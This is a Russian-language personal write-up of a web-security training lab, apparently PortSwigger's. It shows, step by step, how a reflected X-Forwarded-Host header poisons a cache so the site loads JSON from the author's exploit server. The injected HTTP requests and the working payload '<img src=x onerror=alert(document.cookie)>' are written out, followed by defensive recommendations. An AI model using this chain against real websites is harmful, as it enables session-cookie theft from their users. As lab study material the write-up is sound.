эксперт 🔥
### Отравление веб-кэша для использования уязвимости DOM через кэш со строгими критериями кэширования

в лабе есть уяза на основе DOM
карлос посещает решулярно главн стр 
задача - отравить кеш так, чтобы в браузере жертву сработал alert(document.cookie)

-----------
вот запрос к главной странице

```http
GET / HTTP/2
Host: 0a0d00cf035fdad283604c330086003b.web-security-academy.net
Cookie: session=h981EyttJ6YOijDovgXUvNTnnLj5U71M
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a0d00cf035fdad283604c330086003b.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

мое внимание привлекает вот эта надпись, но ее кода нет в ответе в  html 
значит - она динамически подгружается!
и как раз-таки есть такой скрипт
```js
 <script type="text/javascript" src="/resources/js/geolocate.js"></script>
```
![[Снимок экрана 2026-03-25 в 19.54.18.png]]

пробую его подгрузить GET /resources/js/geolocate.js HTTP/2
вот сам файл
```js
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 10
X-Cache: hit
Content-Length: 530

function initGeoLocate(jsonUrl)
{
    fetch(jsonUrl)
        .then(r => r.json())
        .then(j => {
            let geoLocateContent = document.getElementById('shipping-info');

            let img = document.createElement("img");
            img.setAttribute("src", "/resources/images/localShipping.svg");
            geoLocateContent.appendChild(img)

            let div = document.createElement("div");
            div.innerHTML = 'Free shipping to ' + j.country;
            geoLocateContent.appendChild(div)
        });
}

этот скрипт подгружается картинку автомобиля+текст+поставляет локацию прямо конкатенацией в скрипт!
```
этот скрипт  срабатывает каждый раз - когда открывается главная страница

и еще интересно то, что этот файл кешируется сервером, и его время жизни 30 секунд

------
мои мысли:

1. возможно, можно как-то влиять на этот скрипт, внедряя в него js код
2. и возможно, можно заставить сервер закешировать этот ответ с моим скриптом
3. тогда получить отравить ответ для всех , кто зайдет на главную стр

-------

подставить тело запроса не вышло - блокирует 403

---

вот так GET /resources/js/geolocate.js?zzz=777 HTTP/2
тоже нет результата

-----

от вот такого вообще никакого эффекта нет
```http
GET /resources/js/geolocate.js?q=search&utm_content=123?q=)(*&^%$#$%^&*()_)(*&^%$#@!#$%^&*()))(*&^%#%#%#<^>$&<~<#>%>$<@#**%%()*$&#(^%@Y><><%#&*)^@&%#(^$*%<>><#%^()(*&@*#^%&$<><><)(#*^&@$><><#*($&%^@#><><)#$*%(&^&#^@!$<>@#$^@#$!@*&($(*!@#%$^&(!#%><>O@!*#^&%*^!@$><>!)(#&%(&#@^%*&(!#><@#)*%&^(!#%^$><)(@#&$%^(&!#%$()&#!(><)(@#*&%^*@#^&($*)#!@><!_(#*%&(&@^#%><!(#)&$%(&^@#><!P(#&%(&#@^&*$%(!@#><!)*@&$*#!@%$&!^(>< HTTP/2
Host: 0a0d00cf035fdad283604c330086003b.web-security-academy.net
Cookie: session=h981EyttJ6YOijDovgXUvNTnnLj5U71M
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a0d00cf035fdad283604c330086003b.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Length: 0
X-Forwarded-Host: xxxx11
X-Forwarded-Scheme: xxx2
X-Forwarded-Server: xxx3
X-Host: xxx4
X-Original-Url: xxx5
X-Rewrite-Url: xxx6
X-Http-Method-Override: xxx7
Forwarded: xxx8
Origin: xxx9
Accept-Encoding: xxx11
Cookie: xxx22
Pragma: akamai-x-get-cache-key33
X-Cache-Key: xxx44
X-True-Cache-Key: xxx55
Cache-Status: xxx66
Cf-Cache-Status: xxx77
X-Cache: xxx88
X-Cache-Hits: xxx99
Via: xxx111
Age: xxx222
Cache-Control: xxx333
Vary: xxx444


```


---------
я нашел в карте сайта вот это!!!!!!
запрос `GET /resources/json/geolocate.json HTTP/2`
ответ 200 с
```json
{
    "country": "United Kingdom"
}
```

![[Снимок экрана 2026-03-25 в 20.14.29.png]]
теперь стало более ясно, откуда берется инфа про местоположеине 

--------

попробую теперь помучить немного этот запрос
и он тоже кешируемый!
и это как раз и есть то место, которое подставляется в предыдущий скрипт!
```http
GET /resources/json/geolocate.json HTTP/2


--------------------

GET /resources/json/geolocate.json?zzz=777 HTTP/2 нет результатов
utm_content - нет
...

короче - я помучал его также как и предыдущий запрос
```

dom invider от burp - тоже ничего не находит

--------

еще на главной стр есть вот такой html
```html
<script>
initGeoLocate('//' + data.host + '/resources/json/geolocate.json');
</script>
```
че за data.host ?

я обыскал всю карту сайта и нашел его упоминание только 
на главной стр
и  на GET /product?productId=4 
```html
<script>
initGeoLocate('//' + data.host + '/resources/json/geolocate.json');
</script>
```

я проверил и все файлы сайта через консоль, и всю карту сайта, и чето-то нигде не могу найти откуда берет начало это data.host !!!!!!!
короче это просто с сервера приходит.

---------

я еще раз сделал свой запрос - бомбу
```http
GET / HTTP/2
Host: 0a0d00cf035fdad283604c330086003b.web-security-academy.net
Cookie: session=h981EyttJ6YOijDovgXUvNTnnLj5U71M
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a0d00cf035fdad283604c330086003b.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
X-Forwarded-Host: xxxx11
X-Forwarded-Scheme: xxx2
X-Forwarded-Server: xxx3
X-Host: xxx4
X-Original-Url: xxx5
X-Rewrite-Url: xxx6
X-Http-Method-Override: xxx7
Forwarded: xxx8
Origin: xxx9
Accept-Encoding: xxx11
Cookie: xxx22
Pragma: akamai-x-get-cache-key33
X-Cache-Key: xxx44
X-True-Cache-Key: xxx55
Cache-Status: xxx66
Cf-Cache-Status: xxx77
X-Cache: xxx88
X-Cache-Hits: xxx99
Via: xxx111
Age: xxx222
Cache-Control: xxx333
Vary: xxx444


```

и в ответе отразалась эта фигня!!!!!
```html
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 11572

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <script>
            data = {"host":"xxxx11","path":"/"}
        </script>
```

сделал вот так: и есть отражение!
сработал X-Forwarded-Host: xxxx11
![[Снимок экрана 2026-03-25 в 20.49.03.png]]

делаю обычный запрос и получаю тот отравленный вариант!!!
епта! кеш отравлен!!!

![[Снимок экрана 2026-03-25 в 20.48.25.png]]


---------

теперь мое внимание прикованно к
```json
       <script>
            data = {"host":"xxxx11","path":"/"}
        </script>
```

ну если это хост, тогда я попробую сделать запрос к своему эксплойт сервер

сделал так
```http
GET / HTTP/2
Host: 0a0d00cf035fdad283604c330086003b.web-security-academy.net
...
...
Priority: u=0, i
X-Forwarded-Host: exploit-0a7200a203bcda1483dc4b3d018100b3.exploit-server.net/exploit
X-Forwarded-Scheme: xxx2


```
отразилось так:
```html
        <script>
            data = {"host":"exploit-0a7200a203bcda1483dc4b3d018100b3.exploit-server.net/exploit","path":"/"}
        </script>
```
к серверу запросов не было
![[Снимок экрана 2026-03-25 в 20.55.20.png]]

--------

тогда попробую просто напросто сделать xss выйдя из текущего места-подставления пейлоада!

пробую
```html
X-Forwarded-Host: <></>

ответ
       <script>
            data = {"host":"<><\/>","path":"/"}
       </script>
       
   видимо, сервер экранировал мои символы слеша
   
-------------------------
   
   пробую
   X-Forwarded-Host: alert(document.cookie)
   
   ответ
          <script>
            data = {"host":"alert(document.cookie)","path":"/"}
        </script>
        
        
--------------------------
        
пробую
        X-Forwarded-Host: "}alert(document.cookie){"
        
        ответ
        
<script>
data = {"host":"\"}alert(document.cookie){\"","path":"/"}
</script>
экранирует кавычки тоже
```

хм..
попробую подставить еще раз туда свой эксплойт сервер

и вот в логах появились обращения от сервера!
ура!!!!!
```c
45.83.181.90    2026-03-25 16:02:23 +0000 "GET /resources/css/labsDark.css HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"

10.0.3.218      2026-03-25 16:03:13 +0000 "GET /exploit/resources/json/geolocate.json HTTP/1.1" 404 "user-agent: Mozilla/5.0 (⭕️🍺👉Victim👈🍺⭕️) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

45.83.181.90    2026-03-25 16:03:21 +0000 "POST / HTTP/1.1" 302 "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
```

видно что это был запрос по пути /exploit/resources/json/geolocate.json
то есть сервер хотел получить этот файл, но из-за моего отравления кеша - сервер сделал запрос к моему серверу!! гениально! уязвимость подтверждена! 

теперь я могу на своем сервере прописать этот путь /exploit/resources/json/geolocate.json
и разместить там какой-угодно скрипт!

и сервер его возьмет!

и на главной стр и на стр постов есть скрит который качает этот файл, и можно сделать так, чтобы он скачал этот файл с моего сервера!!
```html
</section>
                    <script>
                        initGeoLocate('//' + data.host + '/resources/json/geolocate.json');
                    </script>
                </div>
```

---------
сделал запрос к моему серверу , и на сервере разметил путь к /exploit/resources/json/geolocate.json
и вуаля: вот такие ошибки появились, потому что сайт ждал json, а я ему выдал стандартный ответ от эксплойт сервера Hello, world!

вот эти ссылки из ошибок - они все ведут на мой эксплойт сервер
![[Снимок экрана 2026-03-25 в 21.10.15.png]]


ошибки говорят, что загрузки скрипта была запрещена политикой CORS
```
Access to fetch at 'https://exploit-0a7200a203bcda1483dc4b3d018100b3.exploit-server.net/exploit/resources/json/geolocate.json/resources/json/geolocate.json' from origin 'https://0a0d00cf035fdad283604c330086003b.web-security-academy.net' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource.
```

нужно поменять на моем эксплойт сервере
Content-Type: application/json;

и попробовать добавить
Access-Control-Allow-Origin: *
чтобы cors не ругался

-----
пробую вот так настроить сервер

![[Снимок экрана 2026-03-25 в 21.30.08.png]]

и делаю вот такой запрос 
```http
GET / HTTP/2
Host: 0a0d00cf035fdad283604c330086003b.web-security-academy.net
Cookie: session=h981EyttJ6YOijDovgXUvNTnnLj5U71M
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a0d00cf035fdad283604c330086003b.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
X-Forwarded-Host: exploit-0a7200a203bcda1483dc4b3d018100b3.exploit-server.net
X-Forwarded-Scheme: xxx2


```

иииииии..
ПОЛУЧИЛОСЬ!!!!!!!!! ЕПТАА!!

то что с моего сервера отразилось в ответе!!!
и динамически подставилось  в код страницы
```html
<div id="shipping-info" class="shipping-info">
<img src="/resources/images/localShipping.svg"><div>Free shipping to ZDAROVA ZAE AL</div></div>
```
![[Снимок экрана 2026-03-25 в 21.31.11.png]]

-------

и теперь, все что осталось - это лишь вставить туда мой скрипт с alert(document.cookie)

----
сохранил файл на своем сервере
```html
{
    "country": "<script>alert(document.cookie)</script>"
}
```

отправил запрос который травит хост
потом обновил главную страницу
и в ответе получаю теперь это
```html
<div>Free shipping to 
<script>alert(document.cookie)</script>
</div>
```
![[Снимок экрана 2026-03-25 в 21.40.32.png]]

но алерт не срабатывает почему-то
хотя с виду , алерт норм выглядит или я туплю

------
```html
пробую
</div><script>alert(document.cookie)</script><div>
не сработало
```

----
```html
пробую
alert(document.cookie)
не сработало - так вообще просто как текст
```

-----

еще раз смотрю функцию 
GET /resources/js/geolocate.js HTTP/2

```js
function initGeoLocate(jsonUrl)
{
    fetch(jsonUrl)
        .then(r => r.json())
        .then(j => {
            let geoLocateContent = document.getElementById('shipping-info');

            let img = document.createElement("img");
            img.setAttribute("src", "/resources/images/localShipping.svg");
            geoLocateContent.appendChild(img)

            let div = document.createElement("div");
            div.innerHTML = 'Free shipping to ' + j.country👈👈 ВОТ СЮДА ПОДСТАВЛЯЕТСЯ пейлоад мой (значение страны);
            geoLocateContent.appendChild(div)
        });
}
```

то есть в innerHTML
то есть не нужно скрипт писать
достаточно 
вот так сделать

```json
{
"country": "<img src=x onerror=alert(document.cookie)>"
}
```

ебушки воробушки, сработало...
алерт появился
лаба решена..

-------
вот конфигурация сервера

![[Снимок экрана 2026-03-25 в 21.58.14.png]]

вот запрос
```http
GET / HTTP/2
Host: 0a0d00cf035fdad283604c330086003b.web-security-academy.net
Cookie: session=h981EyttJ6YOijDovgXUvNTnnLj5U71M
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a0d00cf035fdad283604c330086003b.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
X-Forwarded-Host: exploit-0a7200a203bcda1483dc4b3d018100b3.exploit-server.net
X-Forwarded-Scheme: xxx2


-----

ОТВЕТ ИЗ КЕША + ОТРАВЛЕНИЕ КЕША МОИМ ХОСТОМ

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 1
X-Cache: hit
Content-Length: 14824

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <script>
            data = {"host":👉👉🔥"exploit-0a7200a203bcda1483dc4b3d018100b3.exploit-server.net"👈👈✅,"path":"/"}
        </script>

```
и потом в течении 30 сек , любой кто попадает на главн стр или на стр поста, получает аллерт с куками, то есть выполняет мой код

---------
оч классное ощущение, когда такие сложные лабы решаешь сам, без подсказок, оч круто !)

-------

#### суть + выводы

я обнаружил, что на главной странице динамически подгружается json-файл с геоданными, и его содержимое вставляется в dom через innerHTML.


При этом url для загрузки json-файла формируется из переменной `data.host`, которая подставляется в скрипт на стороне сервера. 

Выяснил, что значение data.host берется из заголовка `x-forwarded-host`, который можно подменить, и сервер делал запрос к моему серверу, че самое веселое - что этот ответ кешируется сервером

Кэш сервера настроен так, что ответы с этим заголовком кэшируются, хотя обычно кэширование отключается при наличии динамических заголовков.

Я отправил запрос к главной странице с заголовком `x-forwarded-host`, указывающим на мой эксплойт-сервер

Кэш сохранил этот ответ, где data.host был заменен на мой домен.

После этого любой пользователь, заходящий на главную страницу, получал из кэша страницу, которая подгружала json уже с моего сервера. в json я разместил не страну, а html-тег с событийным атрибутом `<img src=x onerror=alert(document.cookie)>`,  и при вставке через innerHTML этот тег выполнился и украл куки жертвы. 

-------

атака стала возможна из-за трех факторов: 

1- использование недоверенного заголовка x-forwarded-host для генерации важных данных на сервере, 
2- отсутствие санитизации данных из внешнего json-файла, и 
3- агрессивное кэширование ответов с динамическим содержимым

-----
#### как защититься

1 - никогда не использовать заголовки типа x-forwarded-host, x-forwarded-for, x-original-url для генерации контента без жесткой валидации, если их значение нужно для работы приложения, оно должно проходить проверку по белому списку разрешенных доменов

2 - при вставке данных из внешних источников в innerHTML обязательно экранировать спецсимволы или использовать textcontent вместо innerhtml, если не требуется рендеринг html, если html необходим, применять надежную библиотеку санитизации типа dompurify

3 - кэшировать только статические ответы, которые не зависят от заголовков запроса и если ответ формируется с учетом заголовков, они должны включаться в ключ кэша. особенно важно не кэшировать ответы, где подставляются данные из непроверенных источников

4 - настроить csp с ограничением на выполнение скриптов из внешних источников и запретом инлайн-событий. это не спасет от всех векторов, но существенно усложнит эксплуатацию dom-based xss

5 - при работе с json-запросами с других доменов использовать cors правильно: не ставить access-control-allow-origin: * для конфиденциальных данных, и проверять что запросы приходят только от доверенных источников

6 - для защиты от кэш-отравлений, вызванных подменой заголовков, использовать директиву vary для указания что ответ зависит от конкретного заголовка, либо явно запрещать кэширование ответов с непредсказуемыми заголовками

эта лаба показала как цепочка уязвимостей - неправильное использование заголовка, уязвимый кэш и dom-based xss - превращается в полноценную атаку с кражей кук для всех пользователей